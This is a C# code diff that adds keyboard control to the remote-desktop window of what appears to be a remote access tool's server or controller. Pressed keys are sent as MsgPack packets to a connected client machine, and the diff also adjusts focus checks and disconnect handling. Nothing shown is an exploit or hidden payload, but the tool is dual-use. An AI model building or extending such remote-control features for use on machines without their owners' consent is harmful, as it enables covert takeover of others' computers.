@@ -28,14 +28,15 @@ namespace Server.Forms
 
         public int FPS = 0;
         public Stopwatch sw = Stopwatch.StartNew();
-        public Stopwatch RenderSW = Stopwatch.StartNew();
         public IUnsafeCodec decoder = new UnsafeStreamCodec(60);
         public Size rdSize;
         private bool isMouse = false;
-
-
+        private bool isKeyboard = false;
+        public object syncPicbox = new object();
+        private readonly List<Keys> _keysPressed;
         public FormRemoteDesktop()
         {
+            _keysPressed = new List<Keys>();
             InitializeComponent();
         }
 
@@ -178,7 +179,7 @@ namespace Server.Forms
         {
             try
             {
-                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isMouse)
+                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                 {
                     Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
@@ -203,7 +204,7 @@ namespace Server.Forms
         {
             try
             {
-                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isMouse)
+                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                 {
                     Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
@@ -254,15 +255,80 @@ namespace Server.Forms
                 isMouse = true;
                 btnMouse.BackgroundImage = Properties.Resources.mouse_enable;
             }
+            pictureBox1.Focus();
         }
 
         private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
         {
             try
             {
-                Client?.Disconnected();
+                ThreadPool.QueueUserWorkItem((o) =>
+                {
+                    Client?.Disconnected();
+                });
             }
             catch { }
+        }
+
+        private void btnKeyboard_Click(object sender, EventArgs e)
+        {
+            if (isKeyboard)
+            {
+                isKeyboard = false;
+                btnKeyboard.BackgroundImage = Properties.Resources.keyboard;
+            }
+            else
+            {
+                isKeyboard = true;
+                btnKeyboard.BackgroundImage = Properties.Resources.keyboard_on;
+            }
+            pictureBox1.Focus();
+        }
+
+        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
+            {
+                if (!IsLockKey(e.KeyCode))
+                    e.Handled = true;
+
+                if (_keysPressed.Contains(e.KeyCode))
+                    return;
+
+                _keysPressed.Add(e.KeyCode);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
+                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
+                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(true);
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            }
+        }
+
+        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
+        {
+            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isKeyboard)
+            {
+                if (!IsLockKey(e.KeyCode))
+                    e.Handled = true;
+
+                _keysPressed.Remove(e.KeyCode);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
+                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
+                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(false);
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            }
+        }
+
+        private bool IsLockKey(Keys key)
+        {
+            return ((key & Keys.CapsLock) == Keys.CapsLock)
+                   || ((key & Keys.NumLock) == Keys.NumLock)
+                   || ((key & Keys.Scroll) == Keys.Scroll);
         }
     }
 }
